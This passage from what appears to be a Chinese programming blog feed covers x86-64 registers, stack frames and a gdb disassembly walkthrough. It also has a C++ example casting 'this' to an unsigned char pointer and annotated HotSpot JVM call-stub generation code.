class="hljs-meta">.cfi_def_cfa_register</span> <span class="hljs-number">6</span>movl%edi, -<span class="hljs-number">4</span>(%rbp)movl%esi, -<span class="hljs-number">8</span>(%rbp)movl%edx, -<span class="hljs-number">12</span>(%rbp)movl%ecx, -<span class="hljs-number">16</span>(%rbp)movl-<span class="hljs-number">8</span>(%rbp), %eaxmovl-<span class="hljs-number">4</span>(%rbp), %edxaddl%eax, %edxmovl-<span class="hljs-number">12</span>(%rbp), %eaxaddl%eax, %edxmovl-<span class="hljs-number">16</span>(%rbp), %eaxaddl%edx, %eaxpopq%rbp<span class="hljs-meta">.cfi_def_cfa</span> <span class="hljs-number">7</span>, <span class="hljs-number">8</span><span class="hljs-keyword">ret</span><span class="hljs-meta">.cfi_endproc</span><span class="hljs-symbol">.LFE1:</span><span class="hljs-meta">.size</span>add1, .-add1<span class="hljs-meta">.ident</span><span class="hljs-string">"GCC: (Ubuntu 4.8.5-4ubuntu8) 4.8.5"</span><span class="hljs-meta">.section</span>.note<span class="hljs-number">.</span>GNU-stack,<span class="hljs-string">""</span>,@progbits</code></pre><h2 id="汇编用到的一些寄存器及一些指令"><a href="#汇编用到的一些寄存器及一些指令" class="headerlink" title="汇编用到的一些寄存器及一些指令"></a>汇编用到的一些寄存器及一些指令</h2><ul><li>eax, ebx, ecx, edx, esi, edi, ebp(rbp), esp(rbp)等都是X86 汇编语言中CPU上的通用寄存器的名称。  </li><li>rbp 调用函数的栈帧栈底地址</li><li>rsp 被调函数的栈帧栈底地址</li><li>eip：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行</li><li>减少esp(rsp)寄存器的值表示扩展栈帧</li><li>X86-64中，所有寄存器都是64位，相对32位的x86来说，标识符发生了变化，比如：从原来的%ebp变成了%rbp。为了向后兼容性，%ebp依然可以使用，不过指向了%rbp的低32位。</li><li>X86-64有16个64位寄存器，分别是：%rax，%rbx，%rcx，%rdx，%esi，%edi，%rbp，%rsp，%r8，%r9，%r10，%r11，%r12，%r13，%r14，%r15。%rax 作为函数返回值使用。%rsp 栈指针寄存器，指向栈顶。%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数…%rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改。%r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值</li></ul><p>一条call指令，完成了两个任务：</p><ul><li>将调用函数(main)中的下一条指令入栈，被调函数返回后将取这条指令继续执行，64位rsp寄存器的值减8</li><li>修改指令指针寄存器rip的值，使其指向被调函数的执行位置</li></ul><h3 id="寄存器图示"><a href="#寄存器图示" class="headerlink" title="寄存器图示"></a>寄存器图示</h3><pre><code class="hljs html">63              31             0+------------------------------+|%rax           |%eax          | 返回值+------------------------------+|%rbx           |%ebx          | 被调用保护者+------------------------------+|%rcx           |%ecx          | 第四个参数+------------------------------+|%rdx           |%edx          | 第三个参数+------------------------------+|%rsi           |%esi          | 第二个参数+------------------------------+|%rdi           |%edi          | 第一个参数+------------------------------+|%rbp           |%ebp          | 被调用者保护+------------------------------+|%rsp           |%esp          | 堆栈指针+------------------------------+|%r8            |%r8d          | 第五个参数+------------------------------+|%r9            |%r9d          | 第六个参数+------------------------------+|%r10           |%r10d         | 调用者保护+------------------------------+|%r11           |%r11d         | 调用者保护+------------------------------+|%r12           |%r12d         | 被调用者保护+------------------------------+|%r13           |%r13d         | 被调用者保护+------------------------------+|%r14           |%r14d         | 被调用者保护+------------------------------+|%r15           |%r15d         | 被调用者保护+------------------------------+</code></pre><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><pre><code class="hljs html">           +-------------------+           |                   |           |                   |           | other frames      |           |                   |           |                   |           +-------------------+           |                   |           |                   |           | last frame        |           |                   |           |                   |           +-------------------+           | argument 1        |           +-------------------+           | argument 2        |           +-------------------+           | return address    |           +-------------------+%ebp-&gt;     | last frame %ebp   |           +-------------------+           |                   |           |                   |           | current frame     |           |                   |           |                   |           +-------------------+%esp-&gt;     |                   |           +-------------------+</code></pre><p>入口函数是main，然后调用各个子函数。在对应机器语言中，GCC把过程转化成栈帧（frame），简单的说，每个栈帧对应一个过程。X86-32典型栈帧结构中，由%ebp指向栈帧开始，%esp指向栈顶。  </p><h2 id="gcc边调试边反编译汇编代码"><a href="#gcc边调试边反编译汇编代码" class="headerlink" title="gcc边调试边反编译汇编代码"></a>gcc边调试边反编译汇编代码</h2><pre><code class="hljs shell">gdb FunctionInvokedAssembly<span class="hljs-meta">&gt;</span><span class="bash"> b main</span><span class="hljs-meta">&gt;</span><span class="bash"> r</span><span class="hljs-meta">&gt;</span><span class="bash">  disassemble /rm</span>Breakpoint 1, main (args=1, argv=0x7fffffffdf48) at FunctionInvokedAssembly.c:1111printf("%d", add1(100, 200, 500, 600));(gdb) disassemble /rmDump of assembler code for function main:9int  main(int args, char** argv)&#123;   0x00000000004004fd &lt;+0&gt;:55push   %rbp   0x00000000004004fe &lt;+1&gt;:48 89 e5mov    %rsp,%rbp   0x0000000000400501 &lt;+4&gt;:48 83 ec 10sub    $0x10,%rsp   0x0000000000400505 &lt;+8&gt;:89 7d fcmov    %edi,-0x4(%rbp)   0x0000000000400508 &lt;+11&gt;:48 89 75 f0mov    %rsi,-0x10(%rbp)10//  printf("%d", add1(100, 200, 500, 600, 700, 800, 900, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13));11printf("%d", add1(100, 200, 500, 600));=&gt; 0x000000000040050c &lt;+15&gt;:b9 58 02 00 00mov    $0x258,%ecx   0x0000000000400511 &lt;+20&gt;:ba f4 01 00 00mov    $0x1f4,%edx   0x0000000000400516 &lt;+25&gt;:be c8 00 00 00mov    $0xc8,%esi   0x000000000040051b &lt;+30&gt;:bf 64 00 00 00mov    $0x64,%edi   0x0000000000400520 &lt;+35&gt;:b8 00 00 00 00mov    $0x0,%eax   0x0000000000400525 &lt;+40&gt;:e8 13 00 00 00callq  0x40053d &lt;add1&gt;   0x000000000040052a &lt;+45&gt;:89 c6mov    %eax,%esi   0x000000000040052c &lt;+47&gt;:bf f4 05 40 00mov    $0x4005f4,%edi   0x0000000000400531 &lt;+52&gt;:b8 00 00 00 00mov    $0x0,%eax   0x0000000000400536 &lt;+57&gt;:e8 b5 fe ff ffcallq  0x4003f0 &lt;printf@plt&gt;12&#125;   0x000000000040053b &lt;+62&gt;:c9leaveq    0x000000000040053c &lt;+63&gt;:c3retq   End of assembler dump.<span class="hljs-meta">&gt;</span><span class="bash"> info register</span>rax            0x4004fd4195581rbx            0x00rcx            0x4005704195696rdx            0x7fffffffdf58140737488346968rsi            0x7fffffffdf48140737488346952rdi            0x11rbp            0x7fffffffde600x7fffffffde60rsp            0x7fffffffde500x7fffffffde50r8             0x7ffff7dd0d80140737351847296r9             0x7ffff7dd0d80140737351847296r10            0x00r11            0x00r12            0x4004004195328r13            0x7fffffffdf40140737488346944r14            0x00r15            0x00rip            0x40050c0x40050c &lt;main+15&gt;eflags         0x206[ PF IF ]cs             0x3351ss             0x2b43ds             0x00es             0x00fs             0x00gs             0x00</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/u013982161/article/details/51347944" target="_blank" rel="noopener">X86-64寄存器和栈帧</a><br><a href="https://www.cnblogs.com/bangerlee/archive/2012/05/22/2508772.html" target="_blank" rel="noopener">函数调用过程探究</a><br><a href="http://ref.x86asm.net/" target="_blank" rel="noopener">X86 Opcode and Instruction Reference</a><br><a href="https://www.cnblogs.com/foreach-break/p/call-by-reference-OR-call-by-value.html" target="_blank" rel="noopener">你会swap吗，按值传递还是按引用？</a><br><a href="https://www.cnblogs.com/jokerjason/p/9455638.html" target="_blank" rel="noopener">寄存器理解 及 X86汇编入门</a></p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++中将对象this转换成unsigned char指针</title>
    <link href="/2020/04/24/cpp-this-unsigned-pointer/"/>
    <url>/2020/04/24/cpp-this-unsigned-pointer/</url>
    
    <content type="html"><![CDATA[<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><pre><code class="hljs cpp"><span class="hljs-comment">//  ---CodeBlob.h---</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> CODEBLOB_H_</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CODEBLOB_H_</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeBlob</span> &#123;</span><span class="hljs-keyword">private</span>:  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* _name;  <span class="hljs-keyword">int</span>        _size;<span class="hljs-keyword">public</span>:CodeBlob();<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printName</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printSize</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setSize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> size)</span></span>;<span class="hljs-keyword">virtual</span> ~CodeBlob();&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">/* CODEBLOB_H_ */</span></span><span class="hljs-comment">//  ---CodeBlob.cpp---</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"CodeBlob.h"</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> u_char;<span class="hljs-keyword">typedef</span> u_char*       address;CodeBlob::CodeBlob() &#123;_size = <span class="hljs-number">5</span>;_name = <span class="hljs-string">"hello"</span>;&#125;CodeBlob::~CodeBlob() &#123;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodeBlob::printName</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; _name &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodeBlob::printSize</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; _size &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;  address aa = (address)<span class="hljs-keyword">this</span>; <span class="hljs-comment">// 这样写是没语法错误的</span>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; aa &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CodeBlob::setSize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> size)</span></span>&#123;_size = size;&#125;<span class="hljs-comment">//  ---PointerConvert.cpp---</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"CodeBlob.h"</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"hello simon"</span>&lt;&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;CodeBlob cb1;CodeBlob cb2;CodeBlob* cb3 = <span class="hljs-keyword">new</span> CodeBlob();cb1.printName();cb1.setSize(<span class="hljs-number">100</span>);cb1.printSize();cb2.printSize();cb3-&gt;setSize(<span class="hljs-number">20</span>);cb3-&gt;printSize();<span class="hljs-comment">//address a = (address)cb3;</span><span class="hljs-comment">//std::cout &lt;&lt; a &lt;&lt;std::endl;</span><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>此处是可以将对象this转换成unsigned char指针的。adress的值就是对象this的地址。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机解释器与bytecode对接</title>
    <link href="/2020/04/24/vm-interpret-bytecode/"/>
    <url>/2020/04/24/vm-interpret-bytecode/</url>
    
    <content type="html"><![CDATA[<p>心头一直有个疑问，jvm虚拟是如何对接class中的字节码的？或者说在未进入<br>JIT优化阶段时，解释器是如何对接的？</p><h2 id="大概阐述"><a href="#大概阐述" class="headerlink" title="大概阐述"></a>大概阐述</h2><p>hotspot通过C++代码在堆上申请一块空间，向里面填充一组指令，然后把这块空间当成一个函数，通过函数指针去调用刚生成的代码。是不是666，是不是哇超酷毙了。  </p><h2 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h2><h3 id="generate-call-stub"><a href="#generate-call-stub" class="headerlink" title="generate_call_stub"></a>generate_call_stub</h3><pre><code class="hljs cpp"> <span class="hljs-function">address <span class="hljs-title">generate_call_stub</span><span class="hljs-params">(address&amp; return_address)</span> </span>&#123; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 需要一路仔细调试  c++方法  返回无符号char</span>    assert((<span class="hljs-keyword">int</span>)frame::entry_frame_after_call_words == -(<span class="hljs-keyword">int</span>)rsp_after_call_off + <span class="hljs-number">1</span> &amp;&amp;           (<span class="hljs-keyword">int</span>)frame::entry_frame_call_wrapper_offset == (<span class="hljs-keyword">int</span>)call_wrapper_off,           <span class="hljs-string">"adjust this code"</span>);    <span class="hljs-function">StubCodeMark <span class="hljs-title">mark</span><span class="hljs-params">(<span class="hljs-keyword">this</span>, <span class="hljs-string">"StubRoutines"</span>, <span class="hljs-string">"call_stub"</span>)</span></span>;<span class="hljs-comment">//    address start = __ pc(); // SimonNote: 这个方法最终返回的就是这个start  宏展开 ： _masm-&gt;pc()</span>    address start = _masm-&gt; pc(); <span class="hljs-comment">// SimonNote: _code_section 的end 是pc() 也是此处的start</span>    <span class="hljs-comment">// same as in generate_catch_exception()!</span>    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">rsp_after_call</span><span class="hljs-params">(rbp, rsp_after_call_off * wordSize)</span></span>; <span class="hljs-comment">// 这些adress都是准备工作  真正在内存区域生成汇编指令的事情是在下面的做的</span>    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">call_wrapper</span>  <span class="hljs-params">(rbp, call_wrapper_off   * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">result</span>        <span class="hljs-params">(rbp, result_off         * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">result_type</span>   <span class="hljs-params">(rbp, result_type_off    * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">method</span>        <span class="hljs-params">(rbp, method_off         * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">entry_point</span>   <span class="hljs-params">(rbp, entry_point_off    * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">parameters</span>    <span class="hljs-params">(rbp, parameters_off     * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">parameter_size</span><span class="hljs-params">(rbp, parameter_size_off * wordSize)</span></span>;    <span class="hljs-comment">// same as in generate_catch_exception()!</span>    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">thread</span>        <span class="hljs-params">(rbp, thread_off         * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">r15_save</span><span class="hljs-params">(rbp, r15_off * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">r14_save</span><span class="hljs-params">(rbp, r14_off * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">r13_save</span><span class="hljs-params">(rbp, r13_off * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">r12_save</span><span class="hljs-params">(rbp, r12_off * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">rbx_save</span><span class="hljs-params">(rbp, rbx_off * wordSize)</span></span>;    <span class="hljs-comment">// stub code</span>    <span class="hljs-function">__ <span class="hljs-title">enter</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">//SimonNote: macroAssembler_x86.cpp MacroAssembler::enter()   push(rbp); mov(rbp, rsp); 真正在内存区域生成汇编指令！其实就是把指令等opcode写入内存区域</span>    <span class="hljs-function">__ <span class="hljs-title">subptr</span><span class="hljs-params">(rsp, -rsp_after_call_off * wordSize)</span></span>;    <span class="hljs-comment">// save register parameters</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _WIN64</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(parameters,   c_rarg5)</span></span>; <span class="hljs-comment">// parameters</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(entry_point,  c_rarg4)</span></span>; <span class="hljs-comment">// entry_point</span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(method,       c_rarg3)</span></span>; <span class="hljs-comment">// method</span>    <span class="hljs-function">__ <span class="hljs-title">movl</span><span class="hljs-params">(result_type,  c_rarg2)</span></span>;   <span class="hljs-comment">// result type</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(result,       c_rarg1)</span></span>; <span class="hljs-comment">// result</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(call_wrapper, c_rarg0)</span></span>; <span class="hljs-comment">// call wrapper</span>    <span class="hljs-comment">// save regs belonging to calling function</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rbx_save, rbx)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r12_save, r12)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r13_save, r13)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r14_save, r14)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r15_save, r15)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">6</span>; i &lt;= <span class="hljs-number">15</span>; i++) &#123;      <span class="hljs-function">__ <span class="hljs-title">movdqu</span><span class="hljs-params">(xmm_save(i), as_XMMRegister(i))</span></span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">rdi_save</span><span class="hljs-params">(rbp, rdi_off * wordSize)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">rsi_save</span><span class="hljs-params">(rbp, rsi_off * wordSize)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rsi_save, rsi)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rdi_save, rdi)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>    <span class="hljs-function"><span class="hljs-keyword">const</span> Address <span class="hljs-title">mxcsr_save</span><span class="hljs-params">(rbp, mxcsr_off * wordSize)</span></span>;    &#123;      Label skip_ldmx;      <span class="hljs-function">__ <span class="hljs-title">stmxcsr</span><span class="hljs-params">(mxcsr_save)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">movl</span><span class="hljs-params">(rax, mxcsr_save)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">andl</span><span class="hljs-params">(rax, MXCSR_MASK)</span></span>;    <span class="hljs-comment">// Only check control and mask bits</span>      <span class="hljs-function">ExternalAddress <span class="hljs-title">mxcsr_std</span><span class="hljs-params">(StubRoutines::addr_mxcsr_std())</span></span>;      <span class="hljs-function">__ <span class="hljs-title">cmp32</span><span class="hljs-params">(rax, mxcsr_std)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, skip_ldmx)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">ldmxcsr</span><span class="hljs-params">(mxcsr_std)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">bind</span><span class="hljs-params">(skip_ldmx)</span></span>;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-comment">// Load up thread register</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r15_thread, thread)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">reinit_heapbase</span><span class="hljs-params">()</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> ASSERT</span>    <span class="hljs-comment">// make sure we have no pending exceptions</span>    &#123;      Label L;      <span class="hljs-function">__ <span class="hljs-title">cmpptr</span><span class="hljs-params">(Address(r15_thread, Thread::pending_exception_offset()), (<span class="hljs-keyword">int32_t</span>)NULL_WORD)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, L)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">stop</span><span class="hljs-params">(<span class="hljs-string">"StubRoutines::call_stub: entered with pending exception"</span>)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">bind</span><span class="hljs-params">(L)</span></span>;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-comment">// pass parameters if any</span>    BLOCK_COMMENT(<span class="hljs-string">"pass parameters if any"</span>);    Label parameters_done;    <span class="hljs-function">__ <span class="hljs-title">movl</span><span class="hljs-params">(c_rarg3, parameter_size)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">testl</span><span class="hljs-params">(c_rarg3, c_rarg3)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::zero, parameters_done)</span></span>;    Label loop;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(c_rarg2, parameters)</span></span>;       <span class="hljs-comment">// parameter pointer</span>    <span class="hljs-function">__ <span class="hljs-title">movl</span><span class="hljs-params">(c_rarg1, c_rarg3)</span></span>;            <span class="hljs-comment">// parameter counter is in c_rarg1</span>    <span class="hljs-function">__ <span class="hljs-title">BIND</span><span class="hljs-params">(loop)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rax, Address(c_rarg2, <span class="hljs-number">0</span>))</span></span>;<span class="hljs-comment">// get parameter</span>    <span class="hljs-function">__ <span class="hljs-title">addptr</span><span class="hljs-params">(c_rarg2, wordSize)</span></span>;       <span class="hljs-comment">// advance to next parameter</span>    <span class="hljs-function">__ <span class="hljs-title">decrementl</span><span class="hljs-params">(c_rarg1)</span></span>;             <span class="hljs-comment">// decrement counter</span>    <span class="hljs-function">__ <span class="hljs-title">push</span><span class="hljs-params">(rax)</span></span>;                       <span class="hljs-comment">// pass parameter</span>    <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::notZero, loop)</span></span>;    <span class="hljs-comment">// call Java function</span>    <span class="hljs-function">__ <span class="hljs-title">BIND</span><span class="hljs-params">(parameters_done)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rbx, method)</span></span>;             <span class="hljs-comment">// get Method*</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(c_rarg1, entry_point)</span></span>;    <span class="hljs-comment">// get entry_point</span>    <span class="hljs-function">__ <span class="hljs-title">mov</span><span class="hljs-params">(r13, rsp)</span></span>;                   <span class="hljs-comment">// set sender sp</span>    BLOCK_COMMENT(<span class="hljs-string">"call Java function"</span>);    <span class="hljs-function">__ <span class="hljs-title">call</span><span class="hljs-params">(c_rarg1)</span></span>;    BLOCK_COMMENT(<span class="hljs-string">"call_stub_return_address:"</span>);    return_address = __ pc();    <span class="hljs-comment">// store result depending on type (everything that is not</span>    <span class="hljs-comment">// T_OBJECT, T_LONG, T_FLOAT or T_DOUBLE is treated as T_INT)</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(c_rarg0, result)</span></span>;    Label is_long, is_float, is_double, <span class="hljs-built_in">exit</span>;    <span class="hljs-function">__ <span class="hljs-title">movl</span><span class="hljs-params">(c_rarg1, result_type)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">cmpl</span><span class="hljs-params">(c_rarg1, T_OBJECT)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, is_long)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">cmpl</span><span class="hljs-params">(c_rarg1, T_LONG)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, is_long)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">cmpl</span><span class="hljs-params">(c_rarg1, T_FLOAT)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, is_float)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">cmpl</span><span class="hljs-params">(c_rarg1, T_DOUBLE)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, is_double)</span></span>;    <span class="hljs-comment">// handle T_INT case</span>    <span class="hljs-function">__ <span class="hljs-title">movl</span><span class="hljs-params">(Address(c_rarg0, <span class="hljs-number">0</span>), rax)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">BIND</span><span class="hljs-params">(<span class="hljs-built_in">exit</span>)</span></span>;    <span class="hljs-comment">// pop parameters</span>    <span class="hljs-function">__ <span class="hljs-title">lea</span><span class="hljs-params">(rsp, rsp_after_call)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> ASSERT</span>    <span class="hljs-comment">// verify that threads correspond</span>    &#123;      Label L, S;      <span class="hljs-function">__ <span class="hljs-title">cmpptr</span><span class="hljs-params">(r15_thread, thread)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::notEqual, S)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">get_thread</span><span class="hljs-params">(rbx)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">cmpptr</span><span class="hljs-params">(r15_thread, rbx)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, L)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">bind</span><span class="hljs-params">(S)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">jcc</span><span class="hljs-params">(Assembler::equal, L)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">stop</span><span class="hljs-params">(<span class="hljs-string">"StubRoutines::call_stub: threads must correspond"</span>)</span></span>;      <span class="hljs-function">__ <span class="hljs-title">bind</span><span class="hljs-params">(L)</span></span>;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-comment">// restore regs belonging to calling function</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">15</span>; i &gt;= <span class="hljs-number">6</span>; i--) &#123;      <span class="hljs-function">__ <span class="hljs-title">movdqu</span><span class="hljs-params">(as_XMMRegister(i), xmm_save(i))</span></span>;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r15, r15_save)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r14, r14_save)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r13, r13_save)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(r12, r12_save)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rbx, rbx_save)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span>    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rdi, rdi_save)</span></span>;    <span class="hljs-function">__ <span class="hljs-title">movptr</span><span class="hljs-params">(rsi, rsi_save)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>    <span class="hljs-function">__ <span class="hljs-title">ldmxcsr</span><span class="hljs-params">(mxcsr_save)</span></span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>    <span class="hljs-comment">// restore rsp</span>    <span class="hljs-function">__ <span class="hljs-title">addptr</span><span class="hljs-params">(rsp, -rsp_after_call_off * wordSize)</span></span>;    <span class="hljs-comment">// return</span>    <span class="hljs-function">__ <span class="hljs-title">pop</span><span class="hljs-params">(rbp)</span></span>;    <span 